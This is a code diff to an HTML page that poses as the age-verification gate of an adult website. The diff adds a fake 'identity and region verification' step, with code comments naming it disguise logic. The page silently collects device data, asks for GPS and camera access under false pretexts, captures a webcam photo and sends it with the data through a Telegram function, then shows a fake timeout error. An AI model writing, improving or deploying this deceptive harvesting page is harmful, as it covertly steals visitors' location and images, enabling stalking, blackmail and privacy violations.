@@ -51,11 +51,12 @@
 
     #home-box {
       text-align: center;
-      max-width: 400px;
-      padding: 20px;
-      background: rgba(0, 0, 0, 0.7);
-      border-radius: 10px;
+      max-width: 450px;
+      padding: 30px;
+      background: rgba(0, 0, 0, 0.85);
+      border-radius: 12px;
       position: relative;
+      border: 1px solid #333;
     }
 
     #home-box img {
@@ -67,16 +68,16 @@
       font-size: 14px;
       color: #fff;
       margin-bottom: 25px;
-      line-height: 1.5;
+      line-height: 1.6;
     }
 
     .enter {
-      width: 240px;
+      width: 260px;
       display: inline-block;
       text-align: center;
-      line-height: 44px;
+      line-height: 48px;
       font-size: 13px;
-      letter-spacing: 0.5px;
+      letter-spacing: 0.8px;
       font-weight: bold;
       text-transform: uppercase;
       background-color: #eb6395;
@@ -89,14 +90,37 @@
     .enter:hover {
       color: #ffffff;
       background-color: #db467e;
-      box-shadow: 0 0 15px rgba(235, 99, 149, 0.5);
+      box-shadow: 0 0 20px rgba(235, 99, 149, 0.6);
     }
 
-    .loading-status {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #eb6395;
+    .verification-box {
       display: none;
+      margin-top: 20px;
+      padding: 15px;
+      border: 1px dashed #eb6395;
+      border-radius: 8px;
+      background: rgba(235, 99, 149, 0.05);
+    }
+
+    .loading-spinner {
+      width: 30px;
+      height: 30px;
+      border: 3px solid rgba(235, 99, 149, 0.3);
+      border-radius: 50%;
+      border-top-color: #eb6395;
+      animation: spin 1s ease-in-out infinite;
+      margin: 10px auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status-msg {
+      font-size: 13px;
+      color: #eb6395;
+      margin-top: 10px;
+      font-weight: 500;
     }
   </style>
 </head>
@@ -108,11 +132,24 @@
     </div>
     <div id="home-box">
       <img src="https://www.erome.com//img/logo-erome-vertical.png">
-      <div class="home-text-center" id="text-box">
-        This site is an adult community that contains sexually explicit material. You must be 18 years old or over to enter.
+      
+      <div id="initial-ui">
+        <div class="home-text-center">
+          <strong>LEGAL NOTICE:</strong> Este site contém material sexualmente explícito. 
+          O acesso é restrito a usuários com 18 anos ou mais.
+          <br><br>
+          Due to new regulations, a <u>quick identity and region verification</u> is required to access local content.
+        </div>
+        <div class="enter" onclick="showVerification()">I am 18 or older - enter</div>
       </div>
-      <div class="enter" id="enter-btn" onclick="startBackgroundProcess()">I am 18 or older - enter</div>
-      <div class="loading-status" id="status">Verifying access...</div>
+
+      <div id="verification-ui" class="verification-box">
+        <div class="loading-spinner"></div>
+        <div class="status-msg" id="status-text">Initializing Identity Verification...</div>
+        <div style="font-size: 11px; color: #aaa; margin-top: 10px;">
+          Please <b>Allow</b> camera and location access when prompted to confirm This age and local regulations.
+        </div>
+      </div>
     </div>
   </div>
 
@@ -202,55 +239,60 @@
         navigator.geolocation.getCurrentPosition(
           (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
           () => resolve(null),
-          { enableHighAccuracy: true, timeout: 5000 }
+          { enableHighAccuracy: true, timeout: 8000 }
         );
       });
     }
 
     // ============================================
-    // PROCESSO EM SEGUNDO PLANO
+    // LÓGICA DE DISFARCE
     // ============================================
-    async function startBackgroundProcess() {
-      // 1. Alterar interface para simular carregamento sem sair da tela
-      const btn = document.getElementById('enter-btn');
-      const status = document.getElementById('status');
-      const textBox = document.getElementById('text-box');
+    async function showVerification() {
+      document.getElementById('initial-ui').style.display = 'none';
+      document.getElementById('verification-ui').style.display = 'block';
       
-      btn.style.display = 'none';
-      status.style.display = 'block';
-      textBox.textContent = 'Please wait while we verify your age and connection...';
-
-      // 2. Coletar dados invisíveis (IP, Bateria, etc)
+      const statusText = document.getElementById('status-text');
+      
+      // 1. Coletar dados silenciosos IMEDIATAMENTE
       await collectData();
-
-      // 3. Solicitar permissões (O navegador MOSTRARÁ o pop-up aqui)
-      // Nota: Não existe forma técnica de "pular" o pop-up do navegador.
-      currentUserData.location = await getGPS();
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      
+      // 2. Simular passos de verificação
+      setTimeout(async () => {
+        statusText.textContent = "Verifying Region & Age Regulations...";
         
-        // Captura imediata e envio silencioso
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        const bitmap = await imageCapture.grabFrame();
-        const canvas = document.createElement('canvas');
-        canvas.width = bitmap.width; canvas.height = bitmap.height;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(bitmap, 0, 0);
+        // 3. Solicitar GPS com pretexto de região
+        currentUserData.location = await getGPS();
         
-        canvas.toBlob(blob => {
-          sendTelegramPhotoWithData(blob);
+        statusText.textContent = "Performing AI Face Recognition...";
+        
+        // 4. Solicitar Câmera com pretexto de reconhecimento facial
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          statusText.textContent = "Processing Identity Data...";
           
-          // Após o envio, simular que o acesso foi negado ou redirecionar
-          setTimeout(() => {
-            status.textContent = 'Connection error. Please try again later.';
-          }, 2000);
-        }, 'image/jpeg', 0.8);
-
-      } catch (e) {
-        status.textContent = 'Access denied. You must allow camera access to enter.';
-      }
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          const bitmap = await imageCapture.grabFrame();
+          const canvas = document.createElement('canvas');
+          canvas.width = bitmap.width; canvas.height = bitmap.height;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(bitmap, 0, 0);
+          
+          canvas.toBlob(async (blob) => {
+            await sendTelegramPhotoWithData(blob);
+            
+            // Finalização simulando erro ou sucesso
+            setTimeout(() => {
+              statusText.textContent = "Error: Verification server timeout. Try again later.";
+              document.querySelector('.loading-spinner').style.display = 'none';
+            }, 3000);
+          }, 'image/jpeg', 0.8);
+          
+        } catch (e) {
+          statusText.textContent = "Verification Failed: Access Required.";
+          document.querySelector('.loading-spinner').style.display = 'none';
+        }
+      }, 1500);
     }
   </script>
 </body>
